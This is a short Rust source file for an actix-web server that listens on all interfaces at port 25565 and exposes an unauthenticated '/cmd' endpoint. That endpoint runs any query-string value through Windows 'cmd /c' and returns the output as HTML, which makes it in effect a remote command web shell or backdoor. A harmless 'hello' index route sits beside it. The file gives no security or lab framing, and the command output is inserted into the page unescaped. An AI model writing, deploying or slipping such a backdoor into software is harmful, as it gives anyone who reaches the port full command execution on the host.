use std::process::Command;
use actix_web::{App, get, HttpResponse, HttpServer, web};
use serde::Deserialize;

#[actix_web::main]
async fn main() -> std::io::Result<()> {
    HttpServer::new(|| {
        App::new()
            .service(exec)
            .service(index)
    })
        .bind("0.0.0.0:25565")?
        .run()
        .await
}

#[derive(Debug, Deserialize)]
struct CmdRequest{
    line: String
}

#[get("/cmd")]
async fn exec(cmd: web::Query<CmdRequest>) -> HttpResponse {
    let output = Command::new("cmd").arg("/c").arg(format!("chcp 65001 && {}",&cmd.line)).output().unwrap();
    HttpResponse::Ok().body(format!(r#"<html>
    <head>
        <meta charset="UTF-8">
    </head>
    <body>
        <h6>{}</h6>
    </body>
</html>"#,String::from_utf8_lossy(&output.stdout).to_string().replace("\n","<br>")))
}

#[get("/")]
async fn index() -> String{
    return "hello".to_string();
}